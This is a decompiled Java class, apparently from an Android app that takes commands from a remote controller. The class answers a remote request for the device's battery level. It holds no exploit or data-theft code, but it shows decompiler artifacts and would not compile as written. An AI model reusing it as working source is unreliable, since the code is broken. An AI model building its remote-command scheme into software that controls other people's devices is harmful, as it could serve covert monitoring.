package com.vvt.remotecommand.processor.h;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputRequestBatteryInfo;
import com.vvt.remotecontrol.output.RmtCtrlOutputRequestBatteryInfo;
import java.util.ArrayList;

public class a
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public a(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    boolean bool4 = a;
    if (bool4) {}
    int i = ((ArrayList)localObject1).size();
    if (i > 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    localObject1 = new com/vvt/remotecontrol/input/RmtCtrlInputRequestBatteryInfo;
    ((RmtCtrlInputRequestBatteryInfo)localObject1).<init>();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    ((ControlCommand)localObject2).<init>();
    Object localObject3 = RemoteFunction.REQUEST_BATTERY_INFO;
    ((ControlCommand)localObject2).setFunction((RemoteFunction)localObject3);
    ((ControlCommand)localObject2).setData(localObject1);
    boolean bool2 = a;
    if (bool2) {}
    localObject1 = h().execute((ControlCommand)localObject2);
    bool4 = false;
    localObject2 = null;
    boolean bool5 = localObject1 instanceof RmtCtrlOutputRequestBatteryInfo;
    if (bool5) {}
    for (localObject1 = (RmtCtrlOutputRequestBatteryInfo)localObject1;; localObject1 = null)
    {
      if (paramc != null)
      {
        if (localObject1 == null) {
          break label220;
        }
        int j = ((RmtCtrlOutputRequestBatteryInfo)localObject1).getCurrentBatteryLevel();
        if (j <= 0) {
          break label213;
        }
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject3 = "Current battery level is ";
        localObject1 = ((StringBuilder)localObject2).append((String)localObject3).append(j);
        localObject2 = "%";
        localObject1 = (String)localObject2;
        paramc.b(paramRemoteCommand, this, (String)localObject1);
      }
      for (;;)
      {
        bool3 = a;
        if (bool3) {}
        return;
        label213:
        localObject1 = "Cannot get battery level.";
        break;
        label220:
        localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
        localObject2 = "RequestBatteryInfo failed!!";
        ((RemoteCommandException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
      boolean bool3 = false;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcRequestBatteryInfo";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/AppEngine1/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */